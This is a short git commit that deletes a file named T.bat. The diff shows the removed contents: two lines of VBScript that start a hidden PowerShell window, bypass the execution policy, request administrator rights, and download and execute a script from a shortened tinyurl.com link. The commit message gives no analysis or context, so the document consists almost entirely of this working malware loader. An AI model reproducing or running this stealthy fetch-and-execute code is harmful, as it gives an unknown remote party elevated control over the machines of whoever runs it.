3ead9f578a9004c79478af581a9840d687db52b7
AmjadBalls <155375827+AmjadBalls@users.noreply.github.com>
2024-12-25 22:32:46 +0200

    Delete T.bat

--- T.bat
+++
@@ -1,2 +0,0 @@
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process powershell.exe -ArgumentList 'irm ""https://tinyurl.com/4j72ashp"" | iex' -WindowStyle Hidden -Verb RunAs""", 0, False
